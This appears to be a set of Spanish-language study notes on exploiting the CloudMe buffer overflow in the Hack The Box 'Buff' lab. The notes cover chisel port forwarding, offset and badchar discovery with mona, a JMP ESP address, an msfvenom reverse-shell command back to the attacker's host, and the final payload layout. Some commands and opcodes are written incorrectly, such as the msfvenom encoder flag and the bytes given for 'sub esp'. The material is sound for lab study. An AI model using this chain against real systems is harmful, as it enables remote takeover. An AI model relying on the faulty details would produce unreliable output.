Binario que corre de forma interna sobre la máquina objetivo, en el puerto 8888.
Remote Port Forwarding para poder acceder de forma remota a ese puerto:
> Servidor en local --> `./chisel server --reverse --port 1234`
> Cliente en máquina objetivo --> `chisel.exe client 192.168.0.16:1234 R:8888:127.0.0.1:8888`
> Podemos ver en la máquina local cómo el puerto 8888 ya está ocupado --> `lsof -i:8888`

Stack Based BOF diagram:
![[Pasted image 20210917091854.png]]

**Debugging en Windos con Inmunity Debugger sobre el servicio CloudMe.**
Seleccionar un servicio para debugear --> File - Attach - CloudMe

**Construcción del script para BOF - buff_htb_bof.py**
* Crear caractéres semialeatorios especialmente diseñados para probar buffer overflow.
--> /usr/share/metasploit-framework/exploit/pattern_create.rb -l 5000
--> Este payload es copiado en 'buff_htb_bof.py'
* Al ejecutar el exploit contra el servicio CloudMe, que tenemos attached en Inmunity Debugger, podeos ver qué valor toma el EIP.
* Para comprobar el offset, es decir, el tamaño del buffer hasta ocupar el EIP.
-->  /usr/share/metasploit-framework/exploit/pattern_offset.rb -q <valor_EIP>
* Secuencia del payload:
--> payload = A * 1052 + B * 4 + C * 500
--> Las A llenarán el buffer asignado a la entrada de texto
--> Las B llenarán el EIP (Extended Instruction Pointer - Dirección de la siguiente instrucción a ejecutar)
--> Las C llenarán el ESP (Extended Stack Pointer)
* El ESP es la pila, una vez desbordado el buffer, todo el contenido del payload se almacenará en el stack. En este espacion es donde se puede introducir la data.
* OPCODE (Código de operación)
--> Porción de una instrucción de lenguaje máquina que especifica la operación a ser realizada.
--> El OPCODE a buscar es JMP_ESP, una operación de salto a la pila.
--> El EIP debe apuntar a un registro que contenga un JMP_ESP para poder ejecutar el código que cargaremos en la pila.

** Entorno de trabajo con Inmunity Debugger **
Entorno de trabajo con Inmunity Debugger
> `!mona config -set workingfolder C:\Users\S4vitar\Desktop\%p`
> // Setea un directorio como directorio de trabajo
> `!mona bytearray`
> // Array de todos los números hexadecimas de 00 a FF

Comprobar badchars, caracteres que el servicio elimina y defa de funcionar, no los interpreta
> `!mona bytearray -cpb "\x00"`
> // nuevo array eliminando los badchars
> El payload actual sería para comprobar qué badchars existen --> A*1052+B*4+badchars
> Se ejecuta de nuevo el exploit y se compara el fichero badchars.txt con los caracteres introducidos en la pila a través de la dirección del ESP
> `!mona compara -f C:\Users\S4viatar\Desktop\CloudMe\bytearray.txt -a 0022D470`
> Reportará los badchars, es decir, los caracteres que el programa no interpreta
> En este caso, el programa CloudMe no presenta badchars

Crear shellcode, instrucciones a bajo nivel que permitan ejecutar una acción
> `msfvenom -p windows\shell_reverse_tcp -a x86 --platform windows LHOST=192.168.0.16 LPORT=443 -b "\x00" -l x86/shikata_ga_nai -f c`

Descubrir dirección de OPCODE JMP ESP para apuntar desde EIP y poder ejecutar la shellcode introducida en ESP
> `!mona modules`
> Buscar 'dll' con todas las prevenciones deshabilitadas
> OPCODE de jmp ESP --> ffe4
> `!mona find -s "\xff\xe4" -m QfSCore.dll`
> Seleccionamos uno con capacidad de ejecución, dirección --> 0x68a98a76
> En esta dirección, en Inmunity Debugger podemos poner un break para parar en este punto la ejecución y validar si la siguiente instrucción es la ejecución de shellcode
> Esta dirección será la ingresada en el EIP

Mejorar el shellcode
> Introducir una serie de NOPs (No operation code)
> EIP --> OPCODE jmp ESP --> ESP NOPs(\x90) + shellcode
> La introducción e estos NOPs es para dar tiempo a la muestra a desencriptarse en memoria ya que está encriptada con sikata_ga_nai
> NOPs = b"\x90" * 16

No ponemos en escucha --> `nc -nlvp 443`
Ejecutamos el exploit, payload final = before_ip + EIP + NOPs + shellcode 
																A*1052 + dirección jmp ESP + \x90*16 + reverse shell

Mejorar el shellcode eliminando NOPs y utilizando una instrucción para desplazar la pila
> OPCODE de sub esp, 0x10 --> 83 cc 10

